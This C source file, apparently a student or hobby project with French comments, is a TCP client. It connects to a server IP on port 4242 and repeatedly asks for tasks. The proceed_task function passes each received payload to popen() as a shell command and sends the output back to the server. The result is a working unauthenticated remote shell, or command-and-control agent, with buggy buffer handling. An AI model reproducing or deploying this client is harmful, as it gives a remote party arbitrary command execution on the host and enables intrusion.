#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <event.h>


// Send DATA Model
struct mlc_packet_header
{
    double client_id;
    uint8_t cluster_id;
    uint8_t opcode;
    int size_of;
}__attribute__((packed));


struct string_packet
{
    size_t size;
    size_t length;
    char *buffer;
};

int sock = 0;

void send_packet(uint8_t cluster_id,
                  double client_id,
                  uint8_t opcode,
                  char *data,
                  int size_of,
                  int sock) 
{
    struct mlc_packet_header header;
    header.client_id = client_id;
    header.opcode = opcode;
    header.cluster_id = cluster_id;
    header.size_of = sizeof(struct mlc_packet_header) + size_of;

    send(sock, (char*)&header, sizeof(struct mlc_packet_header), 0);
    if(size_of > 0)
        send(sock, data, size_of, 0);
}

void proceed_task(struct mlc_packet_header *header,char *buffer)
{
    // Decoupe du data et cast en char*
    if(strlen(buffer))
        printf("/bin/sh %s\n", buffer);
    FILE *f = popen(buffer, "r");
    char *str = calloc(1, 1024);
    fread(str, 1, 1024, f);
    pclose(f);
    send_packet(1, 1, 3, str, strlen(str), sock);
    free(str);
}


struct string_packet append_buffer(struct string_packet str_p,int length,char* src)
{

        if(str_p.length > str_p.size)
        {
            str_p.size *= 2;
            str_p.buffer = realloc(str_p.buffer,str_p.size);
        }

        for(int i=0 ; i<length; i++)
            str_p.buffer[str_p.length + i] = src[i];

        str_p.length += length;
        return str_p;
}

struct string_packet drain_buffer(struct string_packet str_p, size_t n)
{
    char* new=malloc(str_p.size);

    for(int i=0; i < (str_p.length-n); i++)
        new[i] = str_p.buffer[i + n];
    str_p.buffer = new;

    return str_p;
}

char* strncpy_buffer(char *dest,const char *src,size_t n)
{
    size_t i;
    for(i = 0; i < n; i++)
        dest[i] = src[i];
    return dest;
}

struct string_packet check_rec(struct string_packet str_p)
{
    while(str_p.length >= sizeof(struct mlc_packet_header))
    {
        struct mlc_packet_header *header;

        char *header_str=malloc(sizeof(struct mlc_packet_header));
        header_str = strncpy_buffer(header_str,str_p.buffer,sizeof(struct mlc_packet_header));

        header = (struct mlc_packet_header*)header_str;
        if(str_p.length >= header->size_of)
        {
            str_p = drain_buffer(str_p,sizeof(struct mlc_packet_header));
            char *data=malloc(header->size_of);
            data = strncpy(data,str_p.buffer,header->size_of);
            str_p = drain_buffer(str_p,header->size_of);
            str_p.length -= header->size_of;
            proceed_task(header,data);
        }
    }
    return str_p;
}

void rec_buffer(int socket)
{
    // Buffer du recv
    char *buffer=malloc(1024);

    // Packet entier
    struct string_packet str_p;
    str_p.size=1024;
    str_p.length=0;
    str_p.buffer=malloc(1024);

    int length=0;

    while((length = recv(socket,buffer,1024,0))>0)
    {
        str_p = append_buffer(str_p,length,buffer);
        str_p = check_rec(str_p);
        if(str_p.length <= 0)
            break;
    }


}

/*
** Pour trasnformer le client en bibliothèque il suffirat de 
** donner 2 arguments à cette fonctions :
** - IP du serveur
** - Port à utiliser
*/

int main(int argc , char *argv[])
{

    if(argc != 2)
    {
        printf("Argument 1 : IP\n");
        return 0;
    }

    char *server_ip = argv[1];
    int server_port = 4242;

    char buffer_ask[1024];

    struct sockaddr_in server;
    struct mlc_packet_header header;



    sock = socket(AF_INET , SOCK_STREAM , 0);
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);

    if(connect(sock , (struct sockaddr *)&server , sizeof(server)) == -1)
    {
        printf("Le serveur n'a pas réussi à être atteint :\n    IP : %s\n    PORT : %d\n", server_ip, server_port);
        return 0;
    }

    // Boucle tant que 1, à l'avenir paramètre à changer jusqu'à ce qu'il
    // recoive l'odre de s'arreter. 
    while(1)
    {

        send_packet(1, 1, 1, NULL, 0, sock);
        rec_buffer(sock);
    }

    return 0;
}

